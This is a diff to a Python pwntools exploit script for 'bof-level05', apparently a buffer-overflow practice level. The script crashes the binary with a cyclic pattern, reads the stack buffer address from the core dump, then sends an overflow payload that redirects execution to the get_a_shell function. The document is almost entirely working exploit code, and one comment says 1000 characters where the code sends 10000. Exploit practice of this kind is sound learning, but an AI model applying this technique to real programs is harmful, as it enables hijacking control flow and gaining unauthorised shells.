@@ -4,6 +4,13 @@ import os
 DEBUG = False # toggles gdb.debug or process
 elf = ELF('./bof-level05') # replace this with the actual level
 
+io = elf.process(env={}, setuid=False)
+io.sendline(cyclic(10000)) # send 1000 junk characters
+io.wait()
+core = io.corefile
+buffer_address = core.stack.find(cyclic(50))
+os.unlink(core.path) # delete the file now that we're done with it
+
 # launch the main process (still boilerplate)
 if DEBUG:
     context.log_level = 'DEBUG'
@@ -20,11 +27,10 @@ else:
 get_a_shell = p32(elf.symbols["get_a_shell"])
 
 buf_len = 0x88
-buffer_start = 0xffffdd70
 
 our_stack =  b"A" * 4 + get_a_shell
 our_stack_len = 0x8 
-our_stack_addr = p32(buffer_start + buf_len - our_stack_len)
+our_stack_addr = p32(buffer_address + buf_len - our_stack_len)
 
 payload = (b"A" * (buf_len - our_stack_len)) + our_stack  + our_stack_addr
 io.sendline(payload)
